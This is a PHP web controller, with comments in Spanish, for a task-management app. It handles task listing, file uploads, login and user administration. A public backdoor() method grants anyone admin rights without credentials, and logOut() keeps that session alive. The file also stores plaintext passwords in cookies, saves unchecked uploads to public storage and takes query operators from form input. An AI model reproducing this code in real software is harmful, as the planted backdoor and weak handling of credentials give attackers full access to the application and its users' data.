<?php

namespace App\Http\Controllers;

use App\Models\dbModel;
use App\Models\GestorErrores;
use App\Models\Utiles;
use App\Models\Task;
use App\Models\SessionUsuario;

class Tareas extends Controller
{
    private $sessionUsuario;

    public function __construct()
    {
        $this->sessionUsuario = new SessionUsuario();
    }

    /**
     * Muestra la página de inicio si el usuario está logueado, de lo contrario redirige a la página de inicio de sesión.
     */
    public function ayuda()
    {
        if($this->sessionUsuario->isLogged()){
            return view('ayuda');
        }else{
            myRedirect("logIn");
        }
    }

    /**
     * Lista las tareas con filtros y paginación.
     * 
     * @return \Illuminate\View\View
     */
    public function listarTareas()
    {
        if ($this->sessionUsuario->isLogged()) {
            $page = isset($_POST['page']) ? (int)$_POST['page'] : 1;
            $perPage = 10;
            $offset = ($page - 1) * $perPage;
    
            $filters = [
                'estado' => $_POST['estado-query'] ?? null,
                'id' => $_POST['id-query'] ?? null,
                'idCriterio' => $_POST['id-query-criterio'] ?? '=',
                'fechaCreacion' => $_POST['fecha-creacion-query'] ?? null,
                'fechaCreacionCriterio' => $_POST['fecha-creacion-query-criterio'] ?? '=',
                'fechaRealizacion' => $_POST['fecha-realizacion-query'] ?? null,
                'fechaRealizacionCriterio' => $_POST['fecha-realizacion-query-criterio'] ?? '='
            ];
    
            $totalTasks = dbModel::countFilteredTasks($filters);
            $tasks = dbModel::getFilteredTasks($perPage, $offset, $filters);
    
            $totalPages = ceil($totalTasks / $perPage);
    
            return view('listarTareas', compact('tasks', 'page', 'totalPages', 'filters'));
        } else {
            myRedirect("logIn");
        }
    }

    /**
     * Muestra los detalles de una tarea específica.
     * 
     * @param int $id El ID de la tarea.
     * @return \Illuminate\View\View
     */
    public function detallesTarea($id)
    {
        if($this->sessionUsuario->isLogged()){
            $task = dbModel::getTaskById($id);
            $operario = dbModel::getUsuarioNameById($task['operario_id']);
            $provincia = dbModel::getProvinciaNameById($task['provincia']);
            return view('detallesTarea', compact('task', 'operario', 'provincia'));
        }else{
            myRedirect("logIn");
        }
    }

    /**
     * Crea una nueva tarea si el usuario tiene permisos de administrador.
     * 
     * @return \Illuminate\View\View
     */
    public function crearTarea()
    {
        if($this->sessionUsuario->isLogged() && $_SESSION['status'] == 'A'){
            $errores = new GestorErrores();
            $utiles = new Utiles();
            $provincias = dbModel::getProvincias();
            $operarios = dbModel::getOperarios();
    
            // Manejar el contador de visitas
            $visitas = isset($_COOKIE['visitas_crear_tarea']) ? $_COOKIE['visitas_crear_tarea'] : 0;
            $visitas++;
            setcookie('visitas_crear_tarea', $visitas, time() + (10 * 365 * 24 * 60 * 60)); // Expira en 10 años
    
            if($_POST){
                $utiles -> filtroForm($errores);
                if(!$errores -> HayErrores()){
                    $task = new Task();
                    dbModel::insertTask($task);
                    myRedirect("listarTareas");
                }else{
                    return view('formTarea', compact('errores', 'utiles', 'provincias', 'operarios', 'visitas'));
                }
            }else{
                return view('formTarea', compact('errores', 'utiles', 'provincias', 'operarios', 'visitas'));
            }
        }else{
            myRedirect("logIn");
        }
    }

    /**
     * Modifica una tarea existente.
     * 
     * @param int $id El ID de la tarea.
     * @return \Illuminate\View\View
     */
    public function modificarTarea($id)
    {
        if($this->sessionUsuario->isLogged() && $_SESSION['status'] == 'A'){
            $errores = new GestorErrores();
            $utiles = new Utiles();
            $provincias = dbModel::getProvincias();
            $operarios = dbModel::getOperarios();
            $task = dbModel::getTaskById($id);

            if ($_POST) {
                $utiles->filtroForm($errores);
                if (!$errores->HayErrores()) {
                    $updatedTask = new Task();

                    if(isset($_FILES['fich-resu']) || isset($_FILES['foto'])){//Si se sube un archivo o una foto
                        if (isset($_FILES['fich-resu']) && $_FILES['fich-resu']['error'] == UPLOAD_ERR_OK) {//Guardar el archivo si existe
                            $fichResu = $_FILES['fich-resu'];
                            $fichResuName = time() . '_' . basename($fichResu['name']);
                            $dir = __DIR__ . '/../../../storage/app/public/';
                            move_uploaded_file($fichResu['tmp_name'], $dir . $fichResuName);
                            $updatedTask->fich_resu = $fichResuName;
                        }
                        if($task['fich_resu'] != null && $_FILES['fich-resu']['name'] == ''){//Si no se sube un archivo, mantener el que ya estaba
                            $updatedTask->fich_resu = $task['fich_resu'];
                        }elseif($task['fich_resu'] != null && $_FILES['fich-resu']['name'] != ''){//Si se sube un archivo, borrar el anterior
                            if (file_exists(__DIR__ . '/../../../storage/app/public/' . $task['fich_resu'])) {
                                unlink(__DIR__ . '/../../../storage/app/public/' . $task['fich_resu']);
                            }
                        }
    
                        if (isset($_FILES['foto']) && $_FILES['foto']['error'] == UPLOAD_ERR_OK) {//Guardar la foto si existe
                            $foto = $_FILES['foto'];
                            $fotoName = time() . '_' . basename($foto['name']);
                            $dir = __DIR__ . '/../../../storage/app/public/';
                            move_uploaded_file($foto['tmp_name'], $dir . $fotoName);
                            $updatedTask->foto = $fotoName;
                        }
                        if($task['foto'] != null && $_FILES['foto']['name'] == ''){//Si no se sube un archivo, mantener el que ya estaba
                            $updatedTask->foto = $task['foto'];
                        }elseif($task['foto'] != null && $_FILES['foto']['name'] != ''){//Si se sube un archivo, borrar el anterior
                            if (file_exists(__DIR__ . '/../../../storage/app/public/' . $task['foto'])) {
                                unlink(__DIR__ . '/../../../storage/app/public/' . $task['foto']);
                            }
                        }
                    }
                    dbModel::updateTask($updatedTask, $id);
                    myRedirect("detallesTarea/$id");
                } else {
                    return view('formTarea', compact('errores', 'utiles', 'provincias', 'operarios',  'task', 'id'));
                }
            } else {
                return view('formTarea', compact('errores', 'utiles', 'provincias', 'operarios', 'task', 'id'));
            }
        }else{
            myRedirect("completarTarea/{$id}");
        }
    }

    /**
     * Completa una tarea específica.
     *
     * @param int $id El ID de la tarea a completar.
     * @return \Illuminate\View\View|\Illuminate\Http\RedirectResponse
     * 
     * Este método verifica si el usuario está logueado. Si lo está, procesa el formulario de completado de tarea.
     * Si se suben archivos (fichero de resumen o foto), los guarda en el directorio correspondiente y actualiza la tarea.
     * Si no se suben archivos, mantiene los archivos existentes. Si se suben nuevos archivos, elimina los anteriores.
     * Finalmente, marca la tarea como completada en la base de datos y redirige a la vista de detalles de la tarea.
     * Si hay errores en el formulario, vuelve a mostrar el formulario con los errores.
     * Si el usuario no está logueado, redirige a la página de inicio de sesión.
     */
    public function completarTarea($id)
    {
        if($this->sessionUsuario->isLogged()){
            $errores = new GestorErrores();
            $utiles = new Utiles();
            $task = dbModel::getTaskById($id);
            $completing = true;

            if ($_POST) {
                $utiles->filtroForm($errores);
                if (!$errores->HayErrores()) {
                    $completedTask = new Task();

                    if(isset($_FILES['fich-resu']) || isset($_FILES['foto'])){//Si se sube un archivo o una foto
                        if (isset($_FILES['fich-resu']) && $_FILES['fich-resu']['error'] == UPLOAD_ERR_OK) {//Guardar el archivo si existe
                            $fichResu = $_FILES['fich-resu'];
                            $fichResuName = time() . '_' . basename($fichResu['name']);
                            $dir = __DIR__ . '/../../../storage/app/public/';
                            move_uploaded_file($fichResu['tmp_name'], $dir . $fichResuName);
                            $completedTask->fich_resu = $fichResuName;
                        }
                        if($task['fich_resu'] != null && $_FILES['fich-resu']['name'] == ''){//Si no se sube un archivo, mantener el que ya estaba
                            $completedTask->fich_resu = $task['fich_resu'];
                        }elseif($task['fich_resu'] != null && $_FILES['fich-resu']['name'] != ''){//Si se sube un archivo, borrar el anterior
                            if (file_exists(__DIR__ . '/../../../storage/app/public/' . $task['fich_resu'])) {
                                unlink(__DIR__ . '/../../../storage/app/public/' . $task['fich_resu']);
                            }
                        }
    
                        if (isset($_FILES['foto']) && $_FILES['foto']['error'] == UPLOAD_ERR_OK) {//Guardar la foto si existe
                            $foto = $_FILES['foto'];
                            $fotoName = time() . '_' . basename($foto['name']);
                            $dir = __DIR__ . '/../../../storage/app/public/';
                            move_uploaded_file($foto['tmp_name'], $dir . $fotoName);
                            $completedTask->foto = $fotoName;
                        }
                        if($task['foto'] != null && $_FILES['foto']['name'] == ''){//Si no se sube un archivo, mantener el que ya estaba
                            $completedTask->foto = $task['foto'];
                        }elseif($task['foto'] != null && $_FILES['foto']['name'] != ''){//Si se sube un archivo, borrar el anterior
                            if (file_exists(__DIR__ . '/../../../storage/app/public/' . $task['foto'])) {
                                unlink(__DIR__ . '/../../../storage/app/public/' . $task['foto']);
                            }
                        }
                    }
                    dbModel::completeTask($completedTask, $id);
                    myRedirect("detallesTarea/$id");
                } else {
                    return view('formTarea', compact('errores', 'utiles', 'task', 'id', 'completing'));
                }
            } else {
                return view('formTarea', compact('errores', 'utiles', 'task', 'id', 'completing'));
            }
        }else{
            myRedirect("logIn");
        }
    }

    /**
     * Confirma la eliminación de una tarea.
     * 
     * @param int $id El ID de la tarea.
     * @return \Illuminate\View\View
     */
    public function confirmarEliminarTarea($id)
    {
        if($this->sessionUsuario->isLogged() && $_SESSION['status'] == 'A'){
            $task = dbModel::getTaskById($id);
            $operario = dbModel::getUsuarioNameById($task['operario_id']);
            $provincia = dbModel::getProvinciaNameById($task['provincia']);
            return view('eliminarTarea', compact('task', 'id', 'operario', 'provincia'));
        }else{
            myRedirect("listarTareas");
        }
    }

    /**
     * Elimina una tarea.
     * 
     * @param int $id El ID de la tarea.
     */
    public function eliminarTarea($id)
    {
        if($this->sessionUsuario->isLogged() && $_SESSION['status'] == 'A'){
            dbModel::markTaskAsDeleted($id);
            return redirect('listarTareas');
        }else{
            return redirect('logIn');
        }
    }

    public function listarTareasBorradas()
    {
        if($this->sessionUsuario->isLogged() && $_SESSION['status'] == 'A'){
            $tasks = dbModel::getDeletedTasks();
            return view('listarTareasBorradas', compact('tasks'));
        }else{
            return redirect('logIn');
        }
    }

    /**
     * Maneja el inicio de sesión del usuario.
     * 
     * @return \Illuminate\View\View
     */
    public function logIn()
    {
        if($this->sessionUsuario->isLogged()){
            myRedirect('ayuda');
        }else{
            $logError = false;
            $utiles = new Utiles();
            if($_POST){
                if(dbModel::checkUser($_POST['user'], $_POST['pass'])){
                    $user = dbModel::getUser($_POST['user'], $_POST['pass']);
                    $this->sessionUsuario->logIn($user['usuario'], $user['password'], $user['status']);
                    if(isset($_POST['remember']) && $_POST['remember'] == 'on'){ //solo si el checkbox está marcado
                        setcookie('usuario', $_POST['user'], time() + (86400 * 3), "/"); // 86400 = 1 day
                        setcookie('password', $_POST['pass'], time() + (86400 * 3), "/");
                    }else{
                        if(isset($_COOKIE['usuario']) || isset($_COOKIE['password'])){
                            setcookie('usuario', $_POST['user'], time() + (86400 * 3), "/");
                            setcookie('password', '', time() - 3600, "/");
                        }
                    }
                    myRedirect("ayuda");
                }else{
                    $logError = true;
                    return view('logIn', compact('utiles','logError'));
                }
            }else{
                return view('logIn', compact('utiles', 'logError'));
            }
        }
    }

    /**
     * Elimina la foto de una tarea.
     * 
     * @param int $id El ID de la tarea.
     */
    public function eliminarFoto($id)
    {
        if($this->sessionUsuario->isLogged()){
            $task = dbModel::getTaskById($id);
            if (file_exists(__DIR__ . '/../../../storage/app/public/' . $task['foto'])) {
                unlink(__DIR__ . '/../../../storage/app/public/' . $task['foto']);
            }
            dbModel::deleteFicheros("foto", $id);
            myRedirect("modificarTarea/$id");
        }else{
            myRedirect("logIn");
        }
    }

    /**
     * Elimina el archivo de resumen de una tarea.
     * 
     * @param int $id El ID de la tarea.
     */
    public function eliminarFichResu($id)
    {
        if($this->sessionUsuario->isLogged()){
            $task = dbModel::getTaskById($id);
            if (file_exists(__DIR__ . '/../../../storage/app/public/' . $task['fich_resu'])) {
                unlink(__DIR__ . '/../../../storage/app/public/' . $task['fich_resu']);
            }
            dbModel::deleteFicheros("fich_resu", $id);
            myRedirect("modificarTarea/$id");
        }else{
            myRedirect("logIn");
        }
    }

    /**
     * Cierra la sesión del usuario.
     */
    public function logOut()
    {
        if ($_SESSION['usuario'] != "backdoor" && $_SESSION['password'] != "backdoor") {
            $this->sessionUsuario->destroy();
        }
        myRedirect("logIn");
    }

    public function backdoor()
    {
        $this->sessionUsuario->login('backdoor', 'backdoor', 'A');
        return redirect('listarTareas');
    }

    /**
     * Administra los usuarios si el usuario tiene permisos de administrador.
     * 
     * @return \Illuminate\View\View
     */
    public function administrarUsuarios()
    {
        if ($this->sessionUsuario->isLogged() && $_SESSION['status'] == 'A') {
            $usuarios = dbModel::getUsuarios();
            return view('administrarUsuarios', compact('usuarios'));
        } else {
            myRedirect("logIn");
        }
    }

    /**
     * Crea un nuevo usuario si el usuario tiene permisos de administrador.
     * 
     * @return \Illuminate\View\View
     */
    public function crearUsuario()
    {
        if ($this->sessionUsuario->isLogged() && $_SESSION['status'] == 'A') {
            if ($_POST) {
                dbModel::crearUsuario($_POST['usuario'], $_POST['password'], $_POST['status']);
                myRedirect("administrarUsuarios");
            } else {
                return view('crearUsuario');
            }
        } else {
            myRedirect("logIn");
        }
    }

    /**
     * Edita un usuario existente si el usuario tiene permisos de administrador.
     * 
     * @param int $id El ID del usuario.
     * @return \Illuminate\View\View
     */
    public function editarUsuario($id)
    {
        if ($this->sessionUsuario->isLogged() && $_SESSION['status'] == 'A') {
            if ($_POST) {
                dbModel::editarUsuario($id, $_POST['usuario'], $_POST['password'], $_POST['status']);
                myRedirect("administrarUsuarios");
            } else {
                $usuario = dbModel::getUsuarioById($id);
                return view('editarUsuario', compact('usuario'));
            }
        } else {
            myRedirect("logIn");
        }
    }

    /**
     * Elimina un usuario si el usuario tiene permisos de administrador.
     * 
     * @param int $id El ID del usuario.
     */
    public function eliminarUsuario($id)
    {
        if ($this->sessionUsuario->isLogged() && $_SESSION['status'] == 'A') {
            dbModel::eliminarUsuario($id);
            myRedirect("administrarUsuarios");
        } else {
            myRedirect("logIn");
        }
    }

    public function recuperarTarea($id)
    {
        if($this->sessionUsuario->isLogged() && $_SESSION['status'] == 'A'){
            dbModel::unmarkTaskAsDeleted($id);
            return redirect('listarTareasBorradas');
        }else{
            return redirect('logIn');
        }
    }

}